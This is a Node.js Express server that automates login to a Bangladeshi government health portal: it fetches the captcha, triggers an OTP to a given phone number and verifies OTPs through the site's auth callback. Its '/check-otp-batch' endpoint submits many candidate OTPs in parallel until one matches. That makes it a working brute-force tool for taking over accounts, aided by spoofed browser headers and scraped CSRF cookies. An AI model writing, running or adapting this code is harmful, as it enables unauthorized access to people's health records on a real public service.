const express = require('express');
const fetch = require('node-fetch');
const path = require('path');
const app = express();

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

let sessionData = {
    sessionId: "",
    phone: "",
    captchaImage: "",
    showOtpForm: false,
    otpError: "",
    otpSuccess: ""
};

function generateSessionId() {
    return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
        var r = Math.random() * 16 | 0, v = c == 'x' ? r : (r & 0x3 | 0x8);
        return v.toString(16);
    });
}

async function getLoginCaptcha() {
    sessionData.sessionId = generateSessionId();
    let url = "https://amarswasthyo.mohfw.gov.bd/api/requests/login-captcha";
    
    let headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Content-Type": "application/json",
        "Referer": "https://amarswasthyo.mohfw.gov.bd/login"
    };

    try {
        let res = await fetch(url, {
            method: 'POST',
            headers: headers,
            body: JSON.stringify({ sessionId: sessionData.sessionId }),
            timeout: 7000
        });
        
        let contentType = res.headers.get("content-type");
        if (contentType && contentType.includes("application/json")) {
            let data = await res.json();
            if (data.imageUrl) sessionData.captchaImage = data.imageUrl;
            if (data.sessionId) sessionData.sessionId = data.sessionId;
        }
    } catch (e) {
        console.log("Captcha Error:", e);
    }
}

app.get('/', async (req, res) => {
    if (!sessionData.showOtpForm && !sessionData.otpSuccess) {
        await getLoginCaptcha();
    }
    res.sendFile(path.join(__dirname, 'index.html'));
});

// ফ্রন্টএন্ডে স্টেট ডাটা পাঠানোর জন্য API
app.get('/status', (req, res) => {
    res.json(sessionData);
});

app.post('/', async (req, res) => {
    let action = req.body.action;

    if (action === 'send_otp') {
        sessionData.phone = req.body.phone;
        let captchaAnswer = req.body.captcha_answer;

        let url = "https://amarswasthyo.mohfw.gov.bd/api/requests/send-otp";
        let headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Content-Type": "application/json",
            "Referer": "https://amarswasthyo.mohfw.gov.bd/login",
            "Origin": "https://amarswasthyo.mohfw.gov.bd"
        };
        let payload = {
            captcha: captchaAnswer,
            sessionId: sessionData.sessionId,
            hid: sessionData.phone
        };

        try {
            let response = await fetch(url, {
                method: 'POST',
                headers: headers,
                body: JSON.stringify(payload),
                timeout: 7000
            });
            let resData = await response.json();
            if (resData.success === true) {
                sessionData.showOtpForm = true;
                sessionData.otpError = "";
            } else {
                sessionData.otpError = "Failed to send OTP. Please check info/captcha.";
                await getLoginCaptcha();
            }
        } catch (e) {
            sessionData.otpError = "Error sending OTP request.";
            await getLoginCaptcha();
        }
    } else if (action === 'verify_otp') {
        let otp = req.body.otp;
        let success = await verifyOtpRequest(otp);
        if (success) {
            sessionData.showOtpForm = false;
        }
    }

    res.redirect('/');
});

async function verifyOtpRequest(otp) {
    try {
        let csrfRes = await fetch("https://amarswasthyo.mohfw.gov.bd/api/auth/csrf", {
            headers: { "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/151" },
            timeout: 5000
        });
        let csrfData = await csrfRes.json();
        let csrfToken = csrfData.csrfToken;
        
        let rawCookie = csrfRes.headers.get('set-cookie') || "";
        let cookieMatch = rawCookie.match(/__Host-next-auth\.csrf-token=([^;]+)/);
        let csrfCookie = cookieMatch ? cookieMatch[1] : "";

        if (!csrfToken) return false;

        let postData = new URLSearchParams({
            hid: sessionData.phone,
            otp: otp,
            redirect: 'false',
            csrfToken: csrfToken,
            callbackUrl: 'https://amarswasthyo.mohfw.gov.bd/login',
            json: 'true'
        }).toString();

        let headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/151",
            "Content-Type": "application/x-www-form-urlencoded",
            "Cookie": `__Host-next-auth.csrf-token=${csrfCookie}`,
            "Origin": "https://amarswasthyo.mohfw.gov.bd",
            "Referer": "https://amarswasthyo.mohfw.gov.bd/login"
        };

        let callbackRes = await fetch("https://amarswasthyo.mohfw.gov.bd/api/auth/callback/credentials", {
            method: 'POST',
            headers: headers,
            body: postData,
            timeout: 5000
        });
        let cbData = await callbackRes.json();

        if (cbData.url === "https://amarswasthyo.mohfw.gov.bd/login") {
            sessionData.otpSuccess = `OTP Auto Matched! Success with OTP: <strong>${otp}</strong>`;
            return true;
        }
    } catch (e) {}
    return false;
}

app.post('/check-otp-batch', async (req, res) => {
    let { otps } = req.body;
    if (!otps || !Array.isArray(otps)) {
        return res.json({ success: false });
    }

    let checks = otps.map(async (otp) => {
        let matched = await verifyOtpRequest(String(otp));
        return matched ? otp : null;
    });

    let results = await Promise.all(checks);
    let foundOtp = results.find(result => result !== null);

    if (foundOtp) {
        return res.json({ success: true, matched_otp: foundOtp });
    }

    res.json({ success: false });
});

if (process.env.NODE_ENV !== 'production') {
    app.listen(3000, () => console.log('Server running on port 3000'));
}

module.exports = app;
